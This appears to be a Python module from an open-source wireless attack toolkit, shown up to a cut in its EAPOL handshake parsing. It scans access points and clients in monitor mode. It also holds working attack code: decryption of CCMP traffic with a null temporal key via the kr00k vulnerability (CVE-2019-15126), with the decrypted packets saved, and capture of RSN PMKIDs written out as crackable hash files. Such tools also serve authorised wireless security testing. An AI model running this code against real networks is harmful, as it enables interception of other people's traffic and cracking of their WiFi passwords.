# region Description
"""
wifi.py: Class for attack on wireless network
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.tm import ThreadManager
from scapy.all import rdpcap, wrpcap, sendp, Ether, RadioTap, Scapy_Exception
from scapy.all import Dot11, Dot11FCS, Dot11Elt, Dot11EltRSN, Dot11EltRates, Dot11EltMicrosoftWPA
from scapy.all import Dot11EltVendorSpecific, Dot11AssoReq, AKMSuite, Dot11Auth
from scapy.all import Dot11Beacon, Dot11CCMP, Dot11Deauth, EAPOL
from typing import Dict, Union, List
from struct import pack, unpack
from struct import error as struct_error
from time import strftime
from binascii import unhexlify, hexlify
from subprocess import CompletedProcess, run, PIPE, Popen, STDOUT, check_output
from os import mkdir, listdir, remove
from os.path import getctime, isdir
from os.path import join as path_join
from shutil import rmtree
from time import sleep
from datetime import datetime
from Cryptodome.Cipher import AES
# endregion


# region Main class - WiFi
class WiFi:

    # region Set variables

    # region Public variables

    # Dictionaries
    bssids: Dict[str, Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]]] = dict()
    wpa_handshakes: Dict[str, Dict[str, Dict[str, Union[int, float, str, bytes]]]] = dict()
    pmkid_authentications: Dict[str, Dict[str, Union[float, int, str, bytes]]] = dict()
    kr00k_packets: Dict[str, Dict[str, Dict[str, Union[int, float, str]]]] = dict()

    # Lists
    deauth_packets: List[Dict[str, Union[int, float, str]]] = list()
    association_packets: List[Dict[str, Union[bool, float, str]]] = list()
    channels: List[Dict[str, Union[int, float]]] = list()
    available_wifi_channels: List[int] = list()

    # Bool variables
    debug_mode: bool = False

    # endregion

    # region Private variables
    _base: Base = Base()
    _thread_manager: ThreadManager = ThreadManager(25)

    _interface: Union[None, str] = None
    _prefix: str = '    '
    _airport_path: str = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'
    _set_wifi_channel: int = -1
    _wifi_channels: Dict[str, List[int]] = {
        '2,4 GHz': [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13],
        '5 GHz': [36, 40, 44, 48, 52, 56, 60, 64, 132, 136, 140, 144]
    }
    _wifi_channel_frequencies: Dict[int, int] = {
        2412: 1,
        2417: 2,
        2422: 3,
        2427: 4,
        2432: 5,
        2437: 6,
        2442: 7,
        2447: 8,
        2452: 9,
        2457: 10,
        2462: 11,
        2467: 12,
        2472: 13
    }
    _pcap_directory: str = '/tmp/raw-packet/'
    _akmsuite_types: Dict[int, str] = {
        0x00: "Reserved",
        0x01: "802.1X",
        0x02: "PSK"
    }
    _cipher_types: Dict[int, str] = {
        0x00: "Use group cipher suite",
        0x01: "WEP-40",
        0x02: "TKIP",
        0x03: "Reserved",
        0x04: "CCMP",
        0x05: "WEP-104"
    }
    # endregion

    # endregion

    # region Private methods

    # region Constructor
    def __init__(self,
                 wireless_interface: str,
                 wifi_channel: Union[None, int] = None,
                 debug: bool = False,
                 start_scan: bool = True) -> None:
        """
        Constructor for WiFi class
        :param wireless_interface: Wireless interface name (example: 'wlan0')
        :param wifi_channel: WiFi channel number (example: 1)
        :param debug: Debug mode (default: False)
        """
        try:
            # Set debug mode
            self.debug_mode = debug

            # Set directory with pcap files
            if self._base.get_platform().startswith('Windows'):
                self._pcap_directory = 'C:\\Windows\\Temp\\raw-packet\\'
            if self.debug_mode:
                self._base.print_info('Temp directory for save pcap files: ', str(self._pcap_directory))

            # Check network interface is wireless
            if self.debug_mode:
                self._base.print_info('Check interface: ', str(wireless_interface), ' is wireless')
            assert self._base.check_network_interface_is_wireless(interface_name=wireless_interface), \
                'Network interface: ' + self._base.error_text(wireless_interface) + ' is not wireless!'
            self._interface = wireless_interface
            if self.debug_mode:
                self._base.print_info('Wireless interface: ', str(self._interface))

            # Check network interface support 5 GHz
            if self.debug_mode:
                self._base.print_info('Check wireless interface: ', str(self._interface), ' support 5 GHz')
            self.available_wifi_channels += self._wifi_channels['2,4 GHz']
            if self._support_5ghz():
                if self.debug_mode:
                    self._base.print_info('Wireless interface: ', str(self._interface), ' is support 5 GHz')
                self.available_wifi_channels += self._wifi_channels['5 GHz']
            else:
                if self.debug_mode:
                    self._base.print_info('Wireless interface: ', str(self._interface), ' is not support 5 GHz')

            # Checking the ability to enable monitoring mode
            if self.debug_mode:
                self._base.print_info('Enable monitor mode on wireless interface: ', str(self._interface))
            assert self.enable_monitor_mode(), \
                'Failed to enable monitor mode on wireless interface: ' + self._base.error_text(self._interface)

            # Create thread for reading pcap files
            if start_scan:
                if self.debug_mode:
                    self._base.print_info('Create thread for read pcap files')
                self._thread_manager.add_task(self._read_pcap_files)

                # Set WiFi channel
                if wifi_channel is not None:
                    if self.debug_mode:
                        self._base.print_info('Validate WiFi channel: ', str(wifi_channel))
                    assert self.validate_wifi_channel(wifi_channel=wifi_channel), \
                        'Bad WiFi channel: ' + self._base.error_text(str(wifi_channel))
                    if self.debug_mode:
                        self._base.print_info('Set WiFi channel: ', str(wifi_channel))
                    self._set_wifi_channel = wifi_channel
                    self._switch_wifi_channel(channel=wifi_channel)

                # Switching between WiFi channels
                if self.debug_mode:
                    self._base.print_info('Create thread for scan WiFi SSID\'s and switch between WiFi channels:',
                                          str(self.available_wifi_channels))
                self._thread_manager.add_task(self._scan_ssids)

                # Check sniffer start
                if self.debug_mode:
                    self._base.print_info('Start sniffer')
                assert self._start_sniffer(), 'Failed to start sniffer!'

        except AssertionError as Error:
            self._base.print_error(Error.args[0])
            exit(1)
    # endregion

    # region Check interface support 5 GHz
    def _support_5ghz(self,
                      wireless_interface: Union[None, str] = None) -> bool:
        # Set wireless interface
        if wireless_interface is None:
            wireless_interface = self._interface

        # Mac OS
        if self._base.get_platform().startswith('Darwin'):
            run([self._airport_path + ' ' + wireless_interface + ' --channel=' +
                 str(self._wifi_channels['5 GHz'][0])], shell=True)
            current_channel: CompletedProcess = \
                run([self._airport_path + ' ' + wireless_interface + ' --channel'],
                    shell=True, stdout=PIPE, stderr=STDOUT)
            current_channel: str = current_channel.stdout.decode('utf-8')
            if 'channel: ' + str(self._wifi_channels['5 GHz'][0]) in current_channel:
                return True
            else:
                return False

        # Linux
        elif self._base.get_platform().startswith('Linux'):
            available_channels: CompletedProcess = \
                run(['iwlist ' + wireless_interface + ' freq'], shell=True, stdout=PIPE, stderr=STDOUT)
            available_channels: str = available_channels.stdout.decode('utf-8')
            if 'Channel ' + str(self._wifi_channels['5 GHz'][0]) in available_channels:
                return True
            else:
                return False

        # Windows
        elif self._base.get_platform().startswith('Windows'):
            return False

        # Other
        else:
            return False
    # endregion

    # region Switch WiFi channel on interface
    def _switch_wifi_channel(self, channel: int = 1) -> None:
        assert self.validate_wifi_channel(wifi_channel=channel)
        self.channels.append({'channel': channel, 'timestamp': datetime.utcnow().timestamp()})

        # Mac OS
        if self._base.get_platform().startswith('Darwin'):
            run([self._airport_path + ' ' + self._interface + ' --channel=' + str(channel)], shell=True)

        # Linux
        elif self._base.get_platform().startswith('Linux'):
            run(['iwconfig ' + self._interface + ' channel ' + str(channel)], shell=True)

        # Windows
        elif self._base.get_platform().startswith('Windows'):
            wlanhelper: Popen = Popen('wlanhelper "' + self._interface + '" channel ' + str(channel),
                                      shell=True, stdout=PIPE, stderr=PIPE)
            wlanhelper_output, wlanhelper_error = wlanhelper.communicate()
            if wlanhelper_error != b'' or b'Error' in wlanhelper_output:
                self._base.print_error('Failed to switch channel: ', str(channel))
                exit(1)

        # Other
        else:
            self._base.print_error('This platform: ', self._base.get_platform(), ' is not supported')
            exit(1)

    # endregion

    # region Convert MAC address
    @staticmethod
    def _convert_mac(mac_address: str) -> bytes:
        return unhexlify(mac_address.lower().replace(':', ''))
    # endregion

    # region Parse Beacon tags
    @staticmethod
    def _parse_beacon_tags(tags: bytes) -> Union[None, Dict[int, bytes]]:
        try:
            parsed_tags: Dict[int, bytes] = dict()
            position: int = 0
            while position < len(tags) - 1:
                tag_number = int(unpack('B', tags[position:position + 1])[0])
                tag_length = int(unpack('B', tags[position + 1:position + 2])[0])
                tag_value = bytes(tags[position + 2:position + 2 + tag_length])
                if tag_number in parsed_tags:
                    tag_number += 1000
                parsed_tags[tag_number] = tag_value
                position += 2 + tag_length
            return parsed_tags

        except IndexError:
            return None

        except AssertionError:
            return None
    # endregion

    # region Parse RSN Information beacon tag
    def _parse_rsn_information(self, rsn_information: bytes) -> \
            Union[None, Dict[str, Union[int, bytes, str, List]]]:
        try:
            parsed_rsn_information: Dict[str, Union[int, bytes, str, List]] = dict()
            position: int = 0

            parsed_rsn_information['rsn version']: int = \
                int(unpack('H', rsn_information[position:position + 2])[0])
            position += 2

            parsed_rsn_information['group cipher suite oui']: bytes = \
                rsn_information[position:position + 3]
            position += 3

            parsed_rsn_information['group cipher suite type']: str = \
                self._cipher_types[int(unpack('B', rsn_information[position:position + 1])[0])]
            position += 1

            parsed_rsn_information['pairwise cipher suite count']: int = \
                int(unpack('H', rsn_information[position:position + 2])[0])
            position += 2

            parsed_rsn_information['pairwise cipher suites']: List = list()
            parsed_rsn_information['pairwise cipher suite types']: List = list()
            for _ in range(parsed_rsn_information['pairwise cipher suite count']):
                parsed_rsn_information['pairwise cipher suites'].append({
                    'oui': rsn_information[position:position + 3],
                    'type': self._cipher_types[int(unpack('B', rsn_information[position + 3:position + 4])[0])]
                })
                parsed_rsn_information['pairwise cipher suite types'].\
                    append(self._cipher_types[int(unpack('B', rsn_information[position + 3:position + 4])[0])])
                position += 4

            parsed_rsn_information['auth key management suite count']: int = \
                int(unpack('H', rsn_information[position:position + 2])[0])
            position += 2

            parsed_rsn_information['auth key management suites']: List = list()
            parsed_rsn_information['auth key management suite types']: List = list()
            for _ in range(parsed_rsn_information['auth key management suite count']):
                parsed_rsn_information['auth key management suites'].append({
                    'oui': rsn_information[position:position + 3],
                    'type': self._akmsuite_types[int(unpack('B', rsn_information[position + 3:position + 4])[0])]
                })
                parsed_rsn_information['auth key management suite types'].\
                    append(self._akmsuite_types[int(unpack('B', rsn_information[position + 3:position + 4])[0])])
                position += 4

            parsed_rsn_information['rsn capabilities']: int = \
                int(unpack('H', rsn_information[position:position + 2])[0])
            position += 2

            assert position == len(rsn_information), 'Bad RSN Information length'
            return parsed_rsn_information

        except IndexError:
            return None

        except AssertionError:
            return None

        except struct_error:
            return None
    # endregion

    # region Parse WPA Information beacon tag
    def _parse_wpa_information(self, wpa_information: bytes) -> \
            Union[None, Dict[str, Union[int, bytes, str, List]]]:
        try:
            parsed_wpa_information: Dict[str, Union[int, bytes, str, List]] = dict()
            position: int = 0

            parsed_wpa_information['oui']: bytes = \
                wpa_information[position:position + 3]
            position += 3

            parsed_wpa_information['oui type']: int = \
                int(unpack('B', wpa_information[position:position + 1])[0])
            position += 1

            parsed_wpa_information['wpa version']: int = \
                int(unpack('H', wpa_information[position:position + 2])[0])
            position += 2

            parsed_wpa_information['multicast cipher suite oui']: bytes = \
                wpa_information[position:position + 3]
            position += 3

            parsed_wpa_information['multicast cipher suite type']: str = \
                self._cipher_types[int(unpack('B', wpa_information[position:position + 1])[0])]
            position += 1

            parsed_wpa_information['unicast cipher suite count']: int = \
                int(unpack('H', wpa_information[position:position + 2])[0])
            position += 2

            parsed_wpa_information['unicast cipher suites']: List = list()
            parsed_wpa_information['unicast cipher suite types']: List = list()
            for _ in range(parsed_wpa_information['unicast cipher suite count']):
                parsed_wpa_information['unicast cipher suites'].append({
                    'oui': wpa_information[position:position + 3],
                    'type': self._cipher_types[int(unpack('B', wpa_information[position + 3:position + 4])[0])]
                })
                parsed_wpa_information['unicast cipher suite types'].\
                    append(self._cipher_types[int(unpack('B', wpa_information[position + 3:position + 4])[0])])
                position += 4

            parsed_wpa_information['auth key management suite count']: int = \
                int(unpack('H', wpa_information[position:position + 2])[0])
            position += 2

            parsed_wpa_information['auth key management types']: List = list()
            parsed_wpa_information['auth key management list']: List = list()
            for _ in range(parsed_wpa_information['auth key management suite count']):
                parsed_wpa_information['auth key management list'].append({
                    'oui': wpa_information[position:position + 3],
                    'type': self._akmsuite_types[int(unpack('B', wpa_information[position + 3:position + 4])[0])]
                })
                parsed_wpa_information['auth key management types'].\
                    append(self._akmsuite_types[int(unpack('B', wpa_information[position + 3:position + 4])[0])])
                position += 4

            assert position == len(wpa_information), 'Bad WPA Information length'
            return parsed_wpa_information

        except IndexError:
            return None

        except AssertionError:
            return None

        except struct_error:
            return None
    # endregion

    # region Parse EAPOL payload
    @staticmethod
    def _parse_eapol(packet: bytes) -> Union[None, Dict[str, Union[int, bytes]]]:
        try:
            assert len(packet) >= 99, 'Bad EAPOL payload'
            eapol_parsed_payload: Dict[str, Union[int, bytes]] = dict()
            eapol_header = unpack('!' '2B' 'H' 'B' '2H' 'Q', packet[:17])
            eapol_parsed_payload['version'] = int(eapol_header[0])
            eapol_parsed_payload['type'] = int(eapol_header[1])
            eapol_parsed_payload['length'] = int(eapol_header[2])
            eapol_parsed_payload['key descriptor'] = int(eapol_header[3])
            eapol_parsed_payload['key information'] = int(eapol_header[4])
            eapol_parsed_payload['key length'] = int(eapol_header[5])
            eapol_parsed_payload['replay counter'] = int(eapol_header[6])

            eapol_parsed_payload['wpa key nonce'] = bytes(packet[17:49])
            eapol_parsed_payload['key iv'] = bytes(packet[49:65])
            eapol_parsed_payload['wpa key rsc'] = bytes(packet[65:73])
            eapol_parsed_payload['wpa key id'] = bytes(packet[73:81])
            eapol_parsed_payload['wpa key mic'] = bytes(packet[81:97])
            eapol_parsed_payload['wpa key length'] = int(unpack('!H', packet[97:99])[0])
            eapol_parsed_payload['wpa key data'] = bytes(packet[99: 99 + eapol_parsed_payload['wpa key length']])

            assert 99 + eapol_parsed_payload['wpa key length'] == len(packet), 'Bad EAPOL payload'
            return eapol_parsed_payload

        except IndexError:
            return None

        except AssertionError:
            return None
    # endregion

    # region Extract RSN PMKID
    @staticmethod
    def _extract_rsn_pmkid(wpa_key_data: bytes) -> Union[None, bytes]:
        try:
            assert len(wpa_key_data) >= 22, 'Bad length WPA Key Data'
            wpa_key_data_header = unpack('2B', wpa_key_data[:2])
            tag_number: int = int(wpa_key_data_header[0])
            tag_length: int = int(wpa_key_data_header[1])
            oui: bytes = wpa_key_data[3:5]
            oui_type: bytes = wpa_key_data[5:6]
            assert tag_length + 2 == len(wpa_key_data), 'Bad length RSN PMKID'
            return wpa_key_data[6:]

        except AssertionError:
            return None
    # endregion

    # region Decrypt CCMP data
    def _decrypt(self,
                 encrypted_data: bytes = b'',
                 source_mac_address: str = '01:23:45:67:89:0a',
                 temporal_key: bytes = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                 key_initialization_vector: bytes = b'\x00\x00\x00\x00\x00\x01') -> Union[None, bytes]:
        """
        Decrypt the data
        :param encrypted_data: Bytes of Encrypted data
        :param source_mac_address: Source MAC address (example: '01:23:45:67:89:0a')
        :param temporal_key: 128 bits – Temporal Key (default: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        :param key_initialization_vector: Key Initialization Vector (default: b'\x00\x00\x00\x00\x00\x01')
        :return: Bytes of Decrypted data or None if error
        """
        try:
            assert self._base.mac_address_validation(source_mac_address), 'Bad source MAC address'
            assert len(key_initialization_vector) == 6, 'Bad Key Initialization Vector length'
            assert len(temporal_key) == 16, 'Bad Temporal Key length'
            nonce: bytes = b'\x00' + self._convert_mac(source_mac_address) + key_initialization_vector
            cipher: AES = AES.new(temporal_key, AES.MODE_CCM, nonce, mac_len=8)
            decrypted_data: bytes = cipher.decrypt(encrypted_data)
            assert decrypted_data.startswith(b'\xaa\xaa\x03'), 'Decrypt error'
            return decrypted_data

        except AssertionError:
            return None
    # endregion

    # region Analyze 802.11 packet
    def _analyze_packet(self, packet) -> None:
        try:

            # region 802.11 Beacon
            if packet.haslayer(Dot11Beacon) and \
                    packet.haslayer(Dot11Elt) and \
                    packet[Dot11FCS].type == 0 and \
                    packet[Dot11FCS].subtype == 8 and \
                    packet[Dot11FCS].FCfield.value == 0 and \
                    packet[Dot11FCS].addr1 == 'ff:ff:ff:ff:ff:ff' and \
                    packet[Dot11FCS].addr2 != '' and \
                    packet[Dot11FCS].addr2 == packet[Dot11FCS].addr3:

                # region Get AP BSSID
                bssid = packet[Dot11FCS].addr2
                # endregion

                # region First Beacon frame
                if bssid not in self.bssids.keys():
                    self.bssids[bssid]: \
                        Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]] = dict()
                    self.bssids[bssid]['packets']: int = 0
                    self.bssids[bssid]['clients']: List[str] = list()
                    self.bssids[bssid]['essids']: List[str] = list()
                    self.bssids[bssid]['channels']: List[str] = list()
                    self.bssids[bssid]['signals']: List[int] = list()
                    self.bssids[bssid]['enc list']: List[str] = list()
                    self.bssids[bssid]['auth list']: List[str] = list()
                    self.bssids[bssid]['cipher list']: List[str] = list()
                # endregion

                # region Next Beacon frame
                elif self.bssids[bssid]['packets'] > 5:

                    # Choose the average value of the ESSID
                    self.bssids[bssid]['essid']: str = \
                        max(self.bssids[bssid]['essids'], key=self.bssids[bssid]['essids'].count)

                    # Choose the average value of the Channel
                    self.bssids[bssid]['channel']: str = \
                        max(self.bssids[bssid]['channels'], key=self.bssids[bssid]['channels'].count)

                    # Choose the average value of the Signal
                    self.bssids[bssid]['signal']: int = \
                        max(self.bssids[bssid]['signals'], key=self.bssids[bssid]['signals'].count)

                    # Choose the average value of the Encryption
                    self.bssids[bssid]['enc']: str = \
                        max(self.bssids[bssid]['enc list'], key=self.bssids[bssid]['enc list'].count)

                    # Choose the average value of the Athentication
                    self.bssids[bssid]['auth']: str = \
                        max(self.bssids[bssid]['auth list'], key=self.bssids[bssid]['auth list'].count)

                    # Choose the average value of the Cipher
                    self.bssids[bssid]['cipher']: str = \
                        max(self.bssids[bssid]['cipher list'], key=self.bssids[bssid]['cipher list'].count)

                    # Delete first value from lists
                    self.bssids[bssid]['essids'].pop(0)
                    self.bssids[bssid]['channels'].pop(0)
                    self.bssids[bssid]['signals'].pop(0)
                    self.bssids[bssid]['enc list'].pop(0)
                    self.bssids[bssid]['auth list'].pop(0)
                    self.bssids[bssid]['cipher list'].pop(0)

                    # Decrement number of packets
                    self.bssids[bssid]['packets'] -= 1

                    # Wait 5 seconds
                    assert (datetime.utcnow().timestamp() - self.bssids[bssid]['timestamp']) > 5, \
                        'Less than 5 seconds have passed'
                # endregion

                # region Parse beacon tags, set: Timestamp, ESSID, Channel and Signal

                # Parse Beacon tags
                parsed_beacon_tags: Union[None, Dict[int, bytes]] = \
                    self._parse_beacon_tags(packet[Dot11Beacon].payload.original)
                assert parsed_beacon_tags is not None, 'Bad Beacon packet'

                # Increment number of packets
                self.bssids[bssid]['packets'] += 1

                # Update timestamp
                self.bssids[bssid]['timestamp']: datetime = datetime.utcnow().timestamp()

                # Tag number 0 - ESSID
                if 0 in parsed_beacon_tags.keys():
                    self.bssids[bssid]['essids'].append(parsed_beacon_tags[0].decode('utf-8'))
                else:
                    self.bssids[bssid]['essids'].append('Unknown')

                # Tag number 3 - Current WiFi channel
                if 3 in parsed_beacon_tags.keys():
                    self.bssids[bssid]['channels'].\
                        append(int.from_bytes(parsed_beacon_tags[3], 'little'))
                else:
                    self.bssids[bssid]['channels'].\
                        append(self._wifi_channel_frequencies[packet[RadioTap].ChannelFrequency])

                # Append signal and ESSID in lists
                self.bssids[bssid]['signals'].append(packet[RadioTap].dBm_AntSignal)

                # endregion

                # region Encryption info in beacon

                # region Mixed WPA and WPA2
                if 221 in parsed_beacon_tags.keys() and 48 in parsed_beacon_tags.keys():

                    # Vendor specific oui type 1 - WPA Information element
                    if parsed_beacon_tags[221][3:4] == b'\x01':
                        self.bssids[bssid]['enc list'].append('WPA/WPA2')
                        parsed_wpa_information = self._parse_wpa_information(parsed_beacon_tags[221])
                        if parsed_wpa_information is not None:
                            self.bssids[bssid]['auth list']. \
                                append('/'.join(parsed_wpa_information['auth key management types']))
                            self.bssids[bssid]['cipher list']. \
                                append('/'.join(parsed_wpa_information['unicast cipher suite types']))
                        else:
                            self.bssids[bssid]['auth list'].append('UNKNOWN')
                            self.bssids[bssid]['cipher list'].append('UNKNOWN')

                    # Parse RSN Information tag
                    else:
                        self.bssids[bssid]['enc list'].append('WPA2')
                        parsed_rsn_information = self._parse_rsn_information(parsed_beacon_tags[48])
                        if parsed_rsn_information is not None:
                            self.bssids[bssid]['auth list']. \
                                append('/'.join(parsed_rsn_information['auth key management suite types']))
                            self.bssids[bssid]['cipher list']. \
                                append('/'.join(parsed_rsn_information['pairwise cipher suite types']))
                        else:
                            self.bssids[bssid]['auth list'].append('UNKNOWN')
                            self.bssids[bssid]['cipher list'].append('UNKNOWN')
                # endregion

                # region WPA2 (Tag number 48 - RSN Information)
                elif 48 in parsed_beacon_tags.keys():
                    self.bssids[bssid]['enc list'].append('WPA2')
                    parsed_rsn_information = self._parse_rsn_information(parsed_beacon_tags[48])
                    if parsed_rsn_information is not None:
                        self.bssids[bssid]['auth list'].\
                            append('/'.join(parsed_rsn_information['auth key management suite types']))
                        self.bssids[bssid]['cipher list'].\
                            append('/'.join(parsed_rsn_information['pairwise cipher suite types']))
                    else:
                        self.bssids[bssid]['auth list'].append('UNKNOWN')
                        self.bssids[bssid]['cipher list'].append('UNKNOWN')
                # endregion

                # region WPA or WEP (Tag number 221 - Vendor specific tag)
                elif 221 in parsed_beacon_tags.keys():

                    # Vendor specific oui type 1 - WPA Information element
                    if parsed_beacon_tags[221][3:4] == b'\x01':
                        self.bssids[bssid]['enc list'].append('WPA')
                        parsed_wpa_information = self._parse_wpa_information(parsed_beacon_tags[221])
                        if parsed_wpa_information is not None:
                            self.bssids[bssid]['auth list']. \
                                append('/'.join(parsed_wpa_information['auth key management types']))
                            self.bssids[bssid]['cipher list']. \
                                append('/'.join(parsed_wpa_information['unicast cipher suite types']))
                        else:
                            self.bssids[bssid]['auth list'].append('UNKNOWN')
                            self.bssids[bssid]['cipher list'].append('UNKNOWN')

                    # Vendor specific oui type 2 - WMM/WME
                    elif parsed_beacon_tags[221][3:4] == b'\x02':
                        if 45 in parsed_beacon_tags.keys() and 61 in parsed_beacon_tags.keys():
                            self.bssids[bssid]['enc list'].append('OPEN')
                            self.bssids[bssid]['auth list'].append('-')
                            self.bssids[bssid]['cipher list'].append('OPEN')
                        else:
                            self.bssids[bssid]['enc list'].append('WEP')
                            self.bssids[bssid]['auth list'].append('-')
                            self.bssids[bssid]['cipher list'].append('WEP')

                    # Unknown vendor specific oui type
                    else:
                        self.bssids[bssid]['enc list'].append('UNKNOWN')
                        self.bssids[bssid]['auth list'].append('UNKNOWN')
                        self.bssids[bssid]['cipher list'].append('UNKNOWN')
                # endregion

                # region No encryption
                else:
                    self.bssids[bssid]['enc list'].append('OPEN')
                    self.bssids[bssid]['auth list'].append('-')
                    self.bssids[bssid]['cipher list'].append('OPEN')
                # endregion

                # endregion

                # region First parsed Beacon frame
                if self.bssids[bssid]['packets'] == 1:

                    # Set ESSID
                    self.bssids[bssid]['essid']: str = self.bssids[bssid]['essids'][0]

                    # Set Channel
                    self.bssids[bssid]['channel']: str = self.bssids[bssid]['channels'][0]

                    # Set Signal
                    self.bssids[bssid]['signal']: int = self.bssids[bssid]['signals'][0]

                    # Set Encryption
                    self.bssids[bssid]['enc']: str = self.bssids[bssid]['enc list'][0]

                    # Set Athentication
                    self.bssids[bssid]['auth']: str = self.bssids[bssid]['auth list'][0]

                    # Set Cipher
                    self.bssids[bssid]['cipher']: str = self.bssids[bssid]['cipher list'][0]

                # endregion

            # endregion

            # region 802.11 Null function
            if packet[Dot11FCS].type == 2 and \
                    packet[Dot11FCS].subtype == 4 and \
                    packet[Dot11FCS].FCfield.value % 2 != 0 and \
                    packet[Dot11FCS].addr1 == packet[Dot11FCS].addr3 and \
                    packet[Dot11FCS].addr1 != packet[Dot11FCS].addr2 and \
                    packet[Dot11FCS].payload.name == 'NoPayload':
                try:
                    if packet[Dot11FCS].addr1 in self.bssids.keys():
                        if packet[Dot11FCS].addr2 not in self.bssids[packet[Dot11FCS].addr1]['clients']:
                            self.bssids[packet[Dot11FCS].addr1]['clients'].append(packet[Dot11FCS].addr2)
                except KeyError:
                    pass
            # endregion

            # region 802.11 CCMP
            if packet.haslayer(Dot11CCMP) and \
                    packet[Dot11FCS].type == 2 and \
                    (packet[Dot11FCS].subtype == 8 or packet[Dot11FCS].subtype == 0) and \
                    packet[Dot11FCS].addr1 != packet[Dot11FCS].addr2 and \
                    packet[Dot11CCMP].payload.name == 'NoPayload':

                # region Direction: Client -> AP (from Client to AP)
                if packet[Dot11FCS].FCfield.value % 2 != 0:
                    bssid: str = packet[Dot11FCS].addr1
                    client: str = packet[Dot11FCS].addr2
                    destination_dot11: str = packet[Dot11FCS].addr3
                    source: str = client
                    destination: str = bssid
                    direction: str = 'to-AP'
                # endregion

                # region Direction: AP -> Client (from AP to Client)
                else:
                    bssid: str = packet[Dot11FCS].addr2
                    client: str = packet[Dot11FCS].addr3
                    destination_dot11: str = packet[Dot11FCS].addr1
                    source: str = bssid
                    destination: str = client
                    direction: str = 'from-AP'
                # endregion

                # region Add Client MAC address in clients list
                try:
                    if direction == 'to-AP' and bssid in self.bssids.keys():
                        if client not in self.bssids[bssid]['clients']:
                            self.bssids[bssid]['clients'].append(client)
                except KeyError:
                    pass
                # endregion

                # region Decrypt CCMP packet with NULL 128 bits – Temporal Key (CVE-2019-15126 kr00k vulnerability)
                try:
                    assert len(packet[Dot11CCMP].data) >= 24, 'Bad encrypted data length'
                    key_iv: bytes = \
                        bytes([packet[Dot11CCMP].PN5]) + bytes([packet[Dot11CCMP].PN4]) + \
                        bytes([packet[Dot11CCMP].PN3]) + bytes([packet[Dot11CCMP].PN2]) + \
                        bytes([packet[Dot11CCMP].PN1]) + bytes([packet[Dot11CCMP].PN0])
                    if packet[Dot11FCS].FCfield.value % 2 != 0:
                        decrypted_data = self._decrypt(encrypted_data=packet[Dot11CCMP].data[:-8],
                                                       key_initialization_vector=key_iv,
                                                       source_mac_address=client)
                        ethernet_header: bytes = self._convert_mac(destination_dot11) + self._convert_mac(client)
                    else:
                        decrypted_data = self._decrypt(encrypted_data=packet[Dot11CCMP].data[:-8],
                                                       key_initialization_vector=key_iv,
                                                       source_mac_address=bssid)
                        ethernet_header: bytes = self._convert_mac(client) + self._convert_mac(destination_dot11)

                    assert decrypted_data is not None, 'Can not decrypt CCMP packet with NULL Temporal Key'
                    ethernet_header += decrypted_data[6:8]
                    decrypted_packet: bytes = ethernet_header + decrypted_data[8:]
                    wrpcap('kr00k_' + bssid.replace(':', '') +
                           '_' + client.replace(':', '') + '.pcap',
                           decrypted_packet, append=True)

                    # region Add kr00k packet info into dictionary
                    if source in self.kr00k_packets.keys():
                        if destination in self.kr00k_packets[source].keys():
                            self.kr00k_packets[source][destination]['count'] += 1
                            self.kr00k_packets[source][destination]['timestamp'] = datetime.utcnow().timestamp()
                        else:
                            self.kr00k_packets[source][destination]: Dict[str, Union[int, float, str]] = {
                                'direction': direction,
                                'timestamp': datetime.utcnow().timestamp(),
                                'count': 1
                            }
                    else:
                        self.kr00k_packets[source]: Dict[str, Dict[str, Union[int, float, str]]] = {
                            destination: {
                                'direction': direction,
                                'timestamp': datetime.utcnow().timestamp(),
                                'count': 1
                            }
                        }
                    # endregion

                except AssertionError:
                    pass

                except IndexError:
                    pass
                # endregion

            # endregion

            # region 802.11 EAPOL RSN PMKID
            if packet.haslayer(EAPOL) and \
                    packet[Dot11FCS].type == 2 and \
                    (packet[Dot11FCS].subtype == 8 or
                     packet[Dot11FCS].subtype == 0) and \
                    packet[Dot11FCS].FCfield.value % 2 == 0 and \
                    packet[Dot11FCS].addr1 != packet[Dot11FCS].addr2 and \
                    packet[Dot11FCS].addr2 == packet[Dot11FCS].addr3:

                eapol: Union[None, Dict[str, Union[int, bytes]]] = self._parse_eapol(packet[EAPOL].original)
                bssid: str = packet[Dot11FCS].addr2
                client: str = packet[Dot11FCS].addr1

                if bssid not in self.pmkid_authentications.keys() and eapol['wpa key data'] != b'':
                    self.pmkid_authentications[bssid]: Dict[str, Union[float, int, str, bytes]] = dict()
                    rsn_pmkid: Union[None, bytes] = self._extract_rsn_pmkid(eapol['wpa key data'])
                    assert rsn_pmkid is not None, 'Bad RSN PMKID'
                    pmkid_content: bytes = hexlify(rsn_pmkid) + b'*'
                    pmkid_content += hexlify(self._convert_mac(bssid)) + b'*'
                    pmkid_content += hexlify(self._convert_mac(client)) + b'*'
                    essid: str = 'Unknown'
                    if bssid in self.bssids.keys():
                        if 'essid' in self.bssids[bssid].keys():
                            essid = self.bssids[bssid]['essid']
                    pmkid_content += hexlify(essid.encode()) + b'.'
                    self.pmkid_authentications[bssid]['content']: bytes = pmkid_content
                    self.pmkid_authentications[bssid]['timestamp']: datetime = datetime.utcnow().timestamp()
                    self.pmkid_authentications[bssid]['key version']: int = int(packet[EAPOL].version)
                    self.pmkid_authentications[bssid]['client']: str = client
                    self.pmkid_authentications[bssid]['essid']: str = essid
                    self.pmkid_authentications[bssid]['file']: str = \
                        'wpa' + str(packet[EAPOL].version) + \
                        '_' + bssid.replace(':', '') + \
                        '_' + client.replace(':', '') + \
                        '_' + strftime('%Y%m%d_%H%M%S') + '.pmkid'
                    with open(self.pmkid_authentications[bssid]['file'], 'wb') as pmkid_file:
                        pmkid_file.write(self.pmkid_authentications[bssid]['content'])
            # endregion

            # region 802.11 EAPOL Message 1 of 4
            if packet.haslayer(EAPOL) and \
                    packet[Dot11FCS].type == 2 and \
                    packet[Dot11FCS].subtype == 8 and \
                    packet[Dot11FCS].SC == 0 and \
                    packet[Dot11FCS].FCfield.value % 2 == 0 and \
